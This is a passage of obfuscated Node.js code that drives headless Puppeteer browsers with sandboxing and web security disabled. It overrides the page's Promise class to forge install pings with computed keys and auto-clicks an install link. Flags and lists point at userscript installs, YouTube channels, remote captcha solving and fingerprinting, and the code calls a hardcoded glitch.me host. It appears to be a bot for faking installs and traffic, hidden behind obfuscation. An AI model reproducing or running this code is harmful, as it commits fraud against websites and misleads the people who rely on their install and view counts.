                J[-0x1 * 0x1575 + 0xc7b + 0x90a] = this['block'], J[K >> 0x8 * -0xd7 + 0x10be + 0x4 * -0x281] |= x[0x2290 + -0x242c + 0x5 * 0x53 & K], this['block'] = J[0x1 * 0x1d47 + 0xc * 0x2bd + -0x1 * 0x3e13], K >= 0x331 + 0x2587 + -0x2880 && (this['hashed'] || this['hash'](), J[-0x21b0 + 0x1f88 + 0x2 * 0x114] = this['block'], J[0x1ee2 + -0x1 * 0x1a1e + 0x12d * -0x4] = J[-0x143c + 0x30b * 0x1 + -0x899 * -0x2] = J[0x1b82 * -0x1 + -0x143e + 0x2 * 0x17e1] = J[0x1787 + -0x1042 + 0x2 * -0x3a1] = J[0x311 + -0x1b17 + 0x11 * 0x16a] = J[-0xb * -0x40 + 0x1c60 + -0x1f1b * 0x1] = J[-0x20f5 + 0x13ff + 0x1 * 0xcfc] = J[0x1 * 0x15fc + 0xbeb + -0x21e0] = J[0x232 + 0x7 * -0x4c7 + 0x1f47] = J[0x8bf * 0x4 + -0x9 * -0xfd + -0x2bd8] = J[-0xa9 * 0x9 + -0x592 + 0xb8d] = J[-0x17a8 + -0xe73 + -0x2626 * -0x1] = J[-0xb * 0x241 + 0x1 * -0x178d + 0x28c * 0x13] = J[-0x90d + -0x1ecd + 0x27e7] = J[-0x13ab + 0x2 * 0x363 + 0xcf3] = J[-0x2700 + -0x1076 + 0x3785] = -0x1 * 0x8ee + -0x11b3 * 0x1 + 0x1aa1 * 0x1), J[-0x8a1 * 0x4 + -0x20c4 + 0x4356] = this['hBytes'] << 0x1 * -0x206e + 0x3 * -0xbe1 + 0x4414 | this['bytes'] >>> 0x2363 * -0x1 + -0x177 * -0x1 + 0x2209, J[0x17 * 0xc5 + -0x1623 + 0x47f] = this['bytes'] << 0x7 * -0x1eb + 0x21 * -0xf1 + -0x2c81 * -0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1e7 * -0x3 + 0x1d77 + -0x17b2; J < 0x108a + 0x1b3d + -0x3 * 0xe7d; ++J)
                K = Q[J - (-0x1697 * 0x1 + -0x3d3 + -0x3 * -0x8cf)] ^ Q[J - (0x4 * 0x85 + -0x2295 + 0x2089)] ^ Q[J - (-0x8b4 + -0x17f + 0xa41)] ^ Q[J - (0x257f + -0x4f7 * -0x7 + -0x4830)], Q[J] = K << 0x4bb + 0x5 * -0x506 + 0x1464 | K >>> -0x1 * 0xf42 + 0x141 * 0x1 + -0x20 * -0x71;
              for (J = 0x382 + 0x57 * 0x3d + 0x5 * -0x4d9; J < 0x26a * 0x7 + 0x300 * 0x2 + -0x16d2; J += 0x97 * -0x24 + -0x14f + -0x2 * -0xb48)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x26 * 0xec + -0x1 * -0x1f6c + 0x3 * -0x1625 | L >>> -0x723 + -0x1 * 0x2623 + 0x2d61) + (M & N | ~M & O) + P + (-0x8cd0cf * 0xd3 + -0x10ea * 0x7fa6 + 0x1d2745b * 0x76) + Q[J] << -0xdcf + 0x1575 + -0x7a6) << -0x1b68 * 0x1 + 0x4d * -0x33 + 0x1c * 0x187 | P >>> -0x19f * 0x6 + -0x17ba + 0xb * 0x30d) + (L & (M = M << -0x4fd * 0x1 + -0x19ac + -0x1ec7 * -0x1 | M >>> -0x2e * -0x7f + 0x11d9 + 0x28a9 * -0x1) | ~L & N) + O + (0x61c9994e + 0x6a85a3d + -0xdef79f2) + Q[J + (-0x4 * -0x6b6 + -0x7 * 0x21d + -0x404 * 0x3)] << 0x6b * -0x27 + -0x610 + 0xe5 * 0x19) << 0x1e56 + -0x32f * -0x6 + 0x1 * -0x316b | O >>> -0x15 * 0x7b + 0x1 * -0x1421 + 0x7 * 0x455) + (P & (L = L << 0xa2d + -0x1471 * -0x1 + -0x1e80 | L >>> 0x3a5 + 0x259 + -0x5fc) | ~P & M) + N + (-0x112f99e1 * -0x3 + -0x2 * 0xa321fda + -0x51b * -0xb9f9e) + Q[J + (0x2120 + 0x2 * -0x11d7 + -0x1 * -0x290)] << 0xd53 + 0x1520 + -0x2273 * 0x1) << 0x120d + 0x17 * 0x39 + 0x1727 * -0x1 | N >>> -0xc01 * -0x1 + 0x413 + 0xff9 * -0x1) + (O & (P = P << -0x2 * -0x66a + 0x32e + -0xfe4 | P >>> -0x1255 + 0x26f * 0xa + -0x133 * 0x5) | ~O & L) + M + (0x89e1f960 + -0x3d28770b + 0x24c2936 * 0x6) + Q[J + (-0x1c1f + -0xcc2 * -0x2 + 0x29e)] << 0x1ebd + 0x96d + -0x282a) << -0x3a9 * 0x8 + 0x1 * 0x5f6 + 0x1757 | M >>> 0x85c * -0x4 + -0x1f7b + 0x4106) + (N & (O = O << -0x44f * -0x5 + 0x58f * 0x5 + -0x3138 | O >>> 0xcb * 0x4 + -0x292 * -0x1 + -0x5bc) | ~N & P) + L + (0x2 * 0x1bcb9106 + 0x4b49f * -0x185d + -0x27e8 * -0x3bf72) + Q[J + (-0x176f + -0x2685 + 0xc * 0x52a)] << -0x14fb + 0x74a + 0xdb1, N = N << -0x2098 + -0xa * -0x9d + 0xbd * 0x24 | N >>> -0x219d + 0x22bf + 0x12 * -0x10;
              for (; J < -0x3d1 * -0x2 + -0xd * 0x162 + 0xa80; J += -0x1 * 0x1774 + -0x1e38 + -0xabd * -0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x102d + -0x3a2 * -0x2 + -0x176c | L >>> -0x1e16 * 0x1 + 0x15b * 0x19 + 0x56 * -0xb) + (M ^ N ^ O) + P + (0xdd621a6 + -0x6a9b * 0xb29f + 0x40 * 0x2ad9719) + Q[J] << 0x1fe8 + 0x1867 + -0x5d * 0x9b) << 0xf * -0x9d + -0x2 * 0xce3 + 0x22fe | P >>> 0x164a + 0x208b * 0x1 + 0x2 * -0x1b5d) + (L ^ (M = M << 0x1a06 + -0x1 * 0xbb6 + -0x17 * 0x9e | M >>> 0x262 + -0x43 * -0x43 + -0x13e9) ^ N) + O + (0x8cbf00ba + -0x53aa696d * 0x1 + -0xd715515 * -0x4) + Q[J + (0x15eb + 0x570 * -0x3 + -0x59a)] << -0xf2e + 0x138 * -0x1e + 0x33be) << 0x27b * 0xd + 0x3 * -0x9ac + -0x336 | O >>> -0xda + 0x6a3 * -0x5 + 0x2224) + (P ^ (L = L << 0x9c0 + 0xe66 + 0x1808 * -0x1 | L >>> 0x119d + 0x1 * 0xac6 + 0x1c61 * -0x1) ^ M) + N + (0x6af5 * -0x1dfee + 0x483edb6 * 0x1f + 0x3df * 0x2c4643) + Q[J + (0x3 * 0x219 + 0x9a8 + -0xff1)] << -0x1 * -0x2101 + -0xfd4 + 0x112d * -0x1) << -0x1218 + -0x1492 * 0x1 + 0x26af * 0x1 | N >>> -0x81 + -0x19d * -0xe + -0x3a * 0x61) + (O ^ (P = P << -0x26da + -0x6f + -0x4d * -0x83 | P >>> -0x2220 + -0x1 * -0xda9 + -0x1479 * -0x1) ^ L) + M + (-0x1398bf1a + -0xdaf5 * 0xc14f + 0x127c8f156) + Q[J + (-0x2 * 0xd69 + -0x473 + 0x1f48)] << -0x11 * 0x221 + 0x65 * 0x43 + 0x9c2) << 0x10bc + -0x127a + 0x1c3 | M >>> 0x2420 + -0x5bc * 0x4 + -0xd15) + (N ^ (O = O << 0x1485 + -0x42a * -0x5 + -0x2939 | O >>> 0xb98 + -0x1c4a + 0x10b4) ^ P) + L + (-0x2f * -0x3367cdc + -0x6c9d1745 + 0x44761682) + Q[J + (-0x2 * -0x5db + -0x823 * -0x3 + 0x4f * -0x75)] << 0x79 * 0x29 + 0x1f52 + 0x32b3 * -0x1, N = N << -0x4b5 * 0x3 + 0x25 * -0xfb + 0x3284 | N >>> 0x43 * -0x88 + 0x23a2 + -0x1 * 0x8;
              for (; J < -0x15f1 + 0x1011 + 0x61c; J += 0x19a9 + 0x4 * 0x295 + -0x1 * 0x23f8)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x20bd + -0x1d * -0x2 + -0x20f2 | L >>> -0x3e * 0x3f + -0xfc5 + 0x1f22) + (M & N | M & O | N & O) + P - (-0x9a1588d + 0x1cd93 * -0x57c5 + 0x5d * 0x304e110) + Q[J] << -0x3 * 0x2fe + -0x52 * -0x2f + -0x614) << -0x993 + -0x1e86 + -0x1 * -0x281e | P >>> -0x9 * -0x14b + -0x12c9 + 0x26b * 0x3) + (L & (M = M << 0x158d + 0x3 * -0x1e8 + -0x53d * 0x3 | M >>> -0x20af + -0x21 * -0xc + -0x11 * -0x1d5) | L & N | M & N) + O - (0x1 * -0xbaf84c2e + 0xd3fd79c6 + 0x57df158c) + Q[J + (-0x11 * -0x16b + -0xa0c + -0xe0e * 0x1)] << 0x1ff7 + 0x2 * 0xbaf + -0x1 * 0x3755) << -0x1 * 0x864 + -0x1 * 0xe37 + -0xb50 * -0x2 | O >>> 0x198c * -0x1 + -0x93 * 0x25 + 0x2ee6) + (P & (L = L << 0x1 * 0x22d + 0x19d7 + -0x2 * 0xdf3 | L >>> -0x45f + -0x1daa + 0x220b) | P & M | L & M) + N - (0x5c56c11 * -0x19 + -0x29c5626 * 0x51 + 0x1d4a312d3) + Q[J + (-0x1f2f + -0x989 * 0x2 + -0x10c1 * -0x3)] << -0x83 * -0x2 + 0x85f * -0x4 + 0x2076) << -0x4 * -0x3c7 + 0x1df2 + -0x2d09 | N >>> 0x119d + 0x1c6a * -0x1 + 0x574 * 0x2) + (O & (P = P << -0x160d + -0xe * -0xef + 0x919 | P >>> 0x1 * -0xa7b + 0x17cd + 0x6a8 * -0x2) | O & L | P & L) + M - (-0x51133 * -0x5fc + 0xcb6881fc + -0x78d72c0c) + Q[J + (-0x9ab + -0xab2 + -0x2 * -0xa30)] << 0x720 + -0x200d + 0x18ed) << -0x70a + -0x2147 + -0x3 * -0xd72 | M >>> -0x161f + -0x13fa + 0xa8d * 0x4) + (N & (O = O << 0xe4f + 0xdf3 + 0x709 * -0x4 | O >>> 0x38b * 0xa + 0xf4d * 0x1 + -0x35 * 0xf5) | N & P | O & P) + L - (0x1 * -0x195253c2 + 0x8848aa34 + 0x1edecb2) + Q[J + (0x91 * 0x3e + 0x1 * -0x172b + -0xd * 0xeb)] << -0x11b * -0xb + 0x270 + -0x25 * 0x65, N = N << -0xa * -0x329 + -0x9d6 + 0xa3 * -0x22 | N >>> -0x346 * -0x5 + -0x48 * -0x17 + -0x16d4;
              for (; J < -0xbf8 + -0x250 * -0x10 + -0x18b8; J += -0x2217 * 0x1 + 0x1419 + -0x11 * -0xd3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x207b + 0x17 * -0x1f + 0x2349 | L >>> -0x2c3 * -0x1 + -0x1a9c + -0x1b6 * -0xe) + (M ^ N ^ O) + P - (0x21d0ba * 0x3 + 0x612a5ed9 + -0x2bf292dd) + Q[J] << 0xe4a + 0x11f3 + 0xabf * -0x3) << -0x256a * -0x1 + 0xec5 * 0x1 + 0x16 * -0x25f | P >>> 0x5a * 0x3d + 0x11c + -0x1 * 0x1673) + (L ^ (M = M << -0x750 + 0xf1a * 0x1 + -0x7ac | M >>> -0x5cb * -0x3 + 0x31a * -0xa + 0x1 * 0xda5) ^ N) + O - (-0x1 * 0x7a86733 + 0x17b * 0x240003 + 0x7f9a0ec) + Q[J + (0xe20 + 0xf19 + 0x176 * -0x14)] << -0x252 + 0x65c + -0x40a) << -0x1a29 + -0x5 * 0xd9 + 0x1e6b | O >>> 0xa3 * 0x28 + 0x959 * 0x3 + 0x4 * -0xd5a) + (P ^ (L = L << -0x9 * 0x26d + 0x2 * -0x72e + 0x244f | L >>> -0xa * -0x37c + 0xb15 * 0x1 + 0x92f * -0x5) ^ M) + N - (-0x5509e9dd + 0x1145d37 * -0x5f + 0x1e26b7ee * 0x8) + Q[J + (-0x1433 * -0x1 + -0x2 * 0xf71 + 0x187 * 0x7)] << -0x15d3 + 0xa07 + 0xbcc) << 0x24f7 * 0x1 + -0x15 * 0x94 + -0x18ce | N >>> 0xf3 * -0xa + 0x1af + 0x7ea) + (O ^ (P = P << -0x1 * -0x3b3 + -0x19b6 * -0x1 + 0x1d4b * -0x1 | P >>> -0x22ee + 0x116d * 0x1 + 0x1183 * 0x1) ^ L) + M - (-0x312528d5 + -0x1aa38b * 0x166 + 0x8c031b61) + Q[J + (0x19e6 + 0xb9 * 0x3 + -0x1c0e)] << 0x1 * 0x1d2f + 0x365 * 0x2 + -0x23f9 * 0x1) << 0xc * -0x92 + -0x1bc + 0x899 | M >>> 0x6ad + 0x223 * 0x1 + -0x8b5) + (N ^ (O = O << -0x3ad + 0x97b * 0x3 + 0x2 * -0xc53 | O >>> 0x1970 + 0x1cff + -0x1 * 0x366d) ^ P) + L - (-0x153b9 * 0x3ee7 + 0x685012b9 + -0x822 * -0x407b0) + Q[J + (0x7 * -0x173 + 0x3 * -0x221 + 0x108c)] << 0x871 * -0x1 + 0x119d + -0x92c, N = N << -0x1 * -0x15f4 + 0x1bf6 + 0x4 * -0xc73 | N >>> 0x3 * -0x56f + 0xc * -0xab + -0x1df * -0xd;
              this['h0'] = this['h0'] + L << 0x56d + 0x127d * 0x1 + -0x17ea, this['h1'] = this['h1'] + M << -0x389 + -0x25ba + -0x1 * -0x2943, this['h2'] = this['h2'] + N << -0xec5 + -0x12ff + 0x21c4, this['h3'] = this['h3'] + O << -0x1388 + 0x1 * -0x3f5 + 0x7 * 0x35b, this['h4'] = this['h4'] + P << -0x1f9 * 0x12 + 0x9e5 * -0x1 + 0x2d67;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x4 * -0x70b + -0x1 * 0x72b + 0x16b * 0x19 & 0xc5 + 0x1 * 0x1afc + 0x2 * -0xdd9] + w[J >> 0x79 * 0x4d + 0x2 * -0x632 + 0x17e9 * -0x1 & -0x920 + 0x10b5 * -0x1 + 0x19e4] + w[J >> 0x1a0c * -0x1 + -0x2043 + 0x3a63 * 0x1 & -0x1 * -0x196a + 0x1804 + 0x1075 * -0x3] + w[J >> 0x13d * 0x11 + 0x1 * 0xb7e + -0x207b & -0x1 * 0x1df5 + 0x2691 + -0x88d] + w[J >> 0x3 * -0x15b + -0x1883 * -0x1 + -0x1466 & 0xb0a * 0x3 + 0x1c6c + 0x1 * -0x3d7b] + w[J >> -0x2101 * -0x1 + -0xf85 * -0x2 + 0x1 * -0x4003 & 0x1 * -0x189b + 0x537 + -0x17f * -0xd] + w[J >> 0x1429 + 0x1 * -0x11c7 + -0x25e & -0x24a6 * -0x1 + 0x1977 + -0x3e0e] + w[-0x13 * 0xbc + 0x2 * -0x493 + 0x1729 & J] + w[K >> -0x1 * -0xb1 + 0x2 * -0x2c0 + 0x4eb & -0x550 + -0x22ec + 0x284b] + w[K >> 0x22c7 + -0x44 * 0x61 + -0x8eb * 0x1 & -0x24a0 + 0x16a9 + 0xe06] + w[K >> -0x17e1 + -0x247a + 0x3c6f & 0xa79 * -0x2 + 0x859 + 0xca8] + w[K >> 0x18c3 * 0x1 + -0x11eb * -0x2 + -0x3c89 & 0x9c6 + 0x1425 + -0x1ddc] + w[K >> 0x1259 + 0xf * -0x144 + -0x7 * -0x19 & -0x4 * 0x8b6 + -0x2f9 * 0x2 + -0x1 * -0x28d9] + w[K >> -0x2061 * -0x1 + -0x34 * -0x17 + -0xc57 * 0x3 & -0x9 * -0x3d + -0x7e + -0x198] + w[K >> 0x1 * -0xf6d + -0x13a * -0x1 + -0xe37 * -0x1 & -0x908 + -0x468 + 0x1 * 0xd7f] + w[0x1 * -0x1138 + 0x15fe + -0x4b7 & K] + w[L >> -0x1bd8 + -0x2385 * 0x1 + 0x3f79 * 0x1 & 0xa79 + -0x8bf * -0x1 + -0x147 * 0xf] + w[L >> 0x1 * 0x1db3 + -0x1d65 + -0x1 * 0x36 & -0x1a3 * 0x5 + 0x729 + -0x1 * -0x115] + w[L >> -0x1f55 + 0x1 * 0xd3d + 0x122c & 0x2145 * -0x1 + -0x432 + 0x2586] + w[L >> -0x15b * 0x5 + -0x1 * -0xbff + 0x2c * -0x1e & -0x3af + 0x1d77 * 0x1 + 0x1b7 * -0xf] + w[L >> 0x1 * -0x2205 + -0x32d + 0x1c6 * 0x15 & -0xad * 0x17 + -0x11bc + 0x2156] + w[L >> -0x13a0 + 0x65 * 0x12 + -0xc8e * -0x1 & 0x6d * 0x53 + -0x2ad * -0x1 + -0x25f5] + w[L >> -0x2216 + -0x1f5b + 0xd * 0x509 & -0x1296 + 0x2263 * -0x1 + 0x3508] + w[0x18a + 0xb * 0xa3 + 0x6 * -0x16a & L] + w[M >> 0x2026 + 0xd75 + 0x1 * -0x2d7f & -0x21 * 0x3c + 0x1aff + -0x1334] + w[M >> 0x1272 * 0x2 + -0x2cf + -0x21fd * 0x1 & 0x366 + -0x878 + 0x521] + w[M >> 0x1 * 0x270d + 0x21a1 * -0x1 + 0x558 * -0x1 & 0x1 * -0x1e26 + -0x1 * 0xfc9 + 0x2dfe] + w[M >> -0x1 * -0xdc9 + 0x61d * 0x2 + -0x19f3 & -0x17ef * 0x1 + 0x1 * 0x803 + -0xffb * -0x1] + w[M >> 0x8 * 0x2fb + 0x76 * -0x21 + 0x1 * -0x896 & 0x2465 * 0x1 + -0x5 * 0x607 + -0x1 * 0x633] + w[M >> -0x74 * 0x49 + -0x5a6 + 0x26c2 & 0x1e60 + 0xbb2 + -0x2a03] + w[M >> -0x12e + -0x5 * -0x35b + -0xf95 * 0x1 & 0xfaa + 0x2 * -0x1384 + -0x1 * -0x176d] + w[-0x1e9b + 0x29 * -0x9e + 0x37f8 & M] + w[N >> -0x2e * 0x3f + 0x6 * 0x36d + -0x920 & 0x1e3b + 0x2 * 0x1139 + -0x9 * 0x72e] + w[N >> 0xaf1 * 0x1 + -0x874 + 0x1 * -0x265 & -0x1fc2 + 0x186b + 0x766] + w[N >> -0x26 * 0xc1 + 0x232c + -0x672 & -0x2053 + 0xe9 + -0x1f79 * -0x1] + w[N >> -0x1e77 + -0x59 * 0x25 + 0x2b64 & 0x6 * -0x346 + -0x1 * 0xf7b + 0x232e] + w[N >> -0x100 + 0x1e27 + -0x1d1b & -0x164f * -0x1 + -0x2 * -0xc93 + -0x2f66] + w[N >> -0x25eb + 0x17 * 0x2f + 0x21ba & 0x314 * 0xc + -0x8a4 + -0x1c3d] + w[N >> 0x1821 + 0x1 * -0x92d + -0x2 * 0x778 & -0x2 * 0x1154 + 0xa8e + -0x4d5 * -0x5] + w[-0x4f8 + 0x1 * 0x1cc2 + 0x19 * -0xf3 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xb * -0x29 + -0x25 * -0xa + -0x5 * -0x15 & -0xccb + -0x2 * 0xe4e + 0x2a66,
                J >> 0x1aed + -0xa * -0xe9 + -0x23f7 & -0x349 + -0x4b * 0x11 + 0x1 * 0x943,
                J >> -0x15aa + 0x189 * -0x16 + -0x6ef * -0x8 & -0x1 * -0xfb6 + 0xd76 * -0x1 + -0x141,
                0x1f01 + -0x2528 + 0x7a * 0xf & J,
                K >> 0x22f + 0x3c7 * 0x5 + -0x14fa & 0x1600 + -0xd11 + -0x3f8 * 0x2,
                K >> -0x926 * 0x1 + -0x2b * 0x71 + 0x1c31 & -0x975 + 0x85 * -0x1 + 0xaf9,
                K >> -0xf47 * 0x2 + 0x43c + -0x1 * -0x1a5a & 0x973 + -0x34 * 0x12 + -0x4cc,
                0x14d7 + 0xe70 + 0x449 * -0x8 & K,
                L >> 0xbfa + -0x29e * -0x1 + -0xe80 & 0x3 * 0xbcf + -0x1c3c + 0x2 * -0x319,
                L >> -0xc6b + -0xc9 * -0x20 + 0x1 * -0xca5 & 0x106c + -0x1 * 0x2273 + -0x1 * -0x1306,
                L >> 0x17cd + 0x1d * 0xef + -0x32d8 & -0xe5a + -0x1 * -0x19df + -0xa86,
                0xa * -0x61 + 0x38e + 0x13b & L,
                M >> 0x1 * -0x4f9 + 0x1 * 0x1e4d + -0x193c & 0x24a0 + 0x5e * 0x69 + -0x4a2f,
                M >> -0x1ac1 * -0x1 + -0x37 * -0x5e + 0x3 * -0xfa1 & 0x2643 + 0x917 + -0x2e5b,
                M >> -0x1433 + -0x127 * 0x1f + 0x37f4 & 0x5 * -0x2b7 + -0x25f9 * -0x1 + -0x1767,
                0xa * 0x9e + 0x1943 + -0x10 * 0x1e7 & M,
                N >> -0x13dc + 0x2bd * 0xd + -0xfa5 & -0x1c69 * 0x1 + -0x178c + 0x1a7a * 0x2,
                N >> 0x103e + -0x1767 + 0x739 & -0x2fe + -0x1 * 0xbd4 + -0x1 * -0xfd1,
                N >> -0x376 + -0x4 * 0x1ca + 0x2 * 0x553 & -0xd4f * -0x1 + -0x2192 * -0x1 + -0x2de2,
                -0x5fb + 0x1211 + -0xa7 * 0x11 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1edc + 0x25e5 + 0xd * -0x89), (K = new DataView(J))['setUint32'](0x1966 + -0x11ee + -0x4 * 0x1de, this['h0']), K['setUint32'](-0x252e + -0x1620 + 0x1da9 * 0x2, this['h1']), K['setUint32'](-0xa9 * 0x9 + -0x9a8 + -0xfa1 * -0x1, this['h2']), K['setUint32'](-0x10b * 0x25 + -0x17d * 0xe + -0x7 * -0x87f, this['h3']), K['setUint32'](0x6cb + 0x12bb * 0x1 + 0x1976 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xf70 + 0xf44 + 0x3 * -0xa3c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x16ae + -0x3 * -0x149 + 0x1 * 0x12d3;
            J[-0xfa7 * -0x1 + 0x1996 + 0x187 * -0x1b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x23b6 + -0x1cc6 + -0x101f * -0x4] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x15c1 + 0x5b * 0xe + -0x1aba), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x3ec * 0x5 + 0x7f * -0x5 + 0x1120 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x461 + -0x1f * 0x101 + 0xa57 * 0x4), Promise['resolve'](0x146 * -0x1d + -0xcf9 + 0x63d * 0x8);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x178e + 0x10f1 + 0x69d; j < 0x1b43 + -0x1 * 0xb9e + 0x134 * -0xd; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xfad * -0x1 + 0x6e4 * 0x1 + -0x1691);
    let h = e[f];
    if (c['EGrtbG'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x245b + -0xd18 + 0x1 * 0x3173, r, s, t = 0x1970 + -0x2 * 0x681 + -0xc6e * 0x1; s = m['charAt'](t++); ~s && (r = q % (0x5 * 0x4ae + 0x261 + -0x19c3) ? r * (0xd * 0x1d7 + -0xcc + -0x1 * 0x16df) + s : s, q++ % (0xae0 + -0x3 * 0x5bc + -0x4 * -0x196)) ? o += String['fromCharCode'](-0x240c + 0x198 + -0x717 * -0x5 & r >> (-(-0x1625 + 0x1cf6 + -0x6cf) * q & -0xf92 + 0x2593 * 0x1 + -0x15fb)) : -0xe17 * 0x1 + 0x1461 + -0x64a) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2 * -0x959 + 0xce + 0x4 * 0x479, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x2 * 0x6d9 + -0xef8 + 0x156))['slice'](-(0x20c1 + -0x86b + 0x1854 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['fqxpGs'] = i, b = arguments, c['EGrtbG'] = !![];
    }
    const j = e[-0x9c0 + -0x5c7 + -0x19 * -0x9f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['fqxpGs'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const bm = [
    'zgL1Bs5JB20Vqa',
    ',monster\x20s',
    'DxrOlwz0lxjPAW',
    'BgL0AgvYlwLVlq',
    'gYeLWQbLDZuJWP/dTG',
    '9%8C%E8%84',
    'e/*',
    'y3jLyxrLsw5JBW',
    'newPage',
    'W67cP0ddMSkYnLtdRCourW',
    'e\x20ytd-rich',
    'Ahr0Chm6lY9NCG',
    'y2XVC2u',
    'EcrUWRddGNtdTG',
    'WOTvWPK',
    'W5C0ttJdTMFcSvKraW',
    '6ImZdwpdwT',
    'https://op',
    'zwfZEwzVCMSUBW',
    'get',
    'ltpcJ03dP0uCqq'
  ];
  a = function() {
    return bm;
  };
  return a();
}
const NETWORK_PATIENCE = 0x30b6 * 0x1 + 0x2a7 * -0x1 + -0xecf + (-0x1159 + 0x2135 * -0x1 + -0xa61 * -0x6) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x12f7 + 0xad * -0x1f + -0x3 * -0xd4f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + U(0xf, 'r]Nw') + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1b31 + -0x1a6c + 0x2d * 0x131; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
